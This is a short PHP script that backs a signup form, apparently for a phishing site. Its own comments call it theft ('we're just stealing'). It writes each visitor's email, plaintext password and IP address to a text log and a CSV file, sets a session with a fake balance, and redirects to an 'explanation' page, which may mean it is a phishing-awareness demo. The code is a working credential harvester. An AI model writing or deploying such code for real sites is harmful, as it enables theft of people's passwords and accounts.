<?php
// Get user credentials
$email = $_POST['email'];
$password = $_POST['password'];
$confirm = $_POST['confirm_password'];

// Log to file (plain text theft)
$log_entry = date('Y-m-d H:i:s') . " | SIGNUP | Email: $email | Password: $password | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
file_put_contents('admin/logs/credentials.txt', $log_entry, FILE_APPEND);

// Create admin directory if it doesn't exist
if(!is_dir('admin/logs')) {
    mkdir('admin/logs', 0777, true);
}

// Also log to CSV
$csv_line = "\"$email\",\"$password\",\"" . date('Y-m-d H:i:s') . "\",\"" . $_SERVER['REMOTE_ADDR'] . "\"\n";
file_put_contents('admin/logs/users.csv', $csv_line, FILE_APPEND);

// Fake database connection (we're just stealing, not storing properly)
$hashed_password = password_hash($password, PASSWORD_DEFAULT);

// Set session and redirect
session_start();
$_SESSION['email'] = $email;
$_SESSION['balance'] = 10.00;

// Redirect to explanation page
header('Location: explanation.html');
exit();
?>
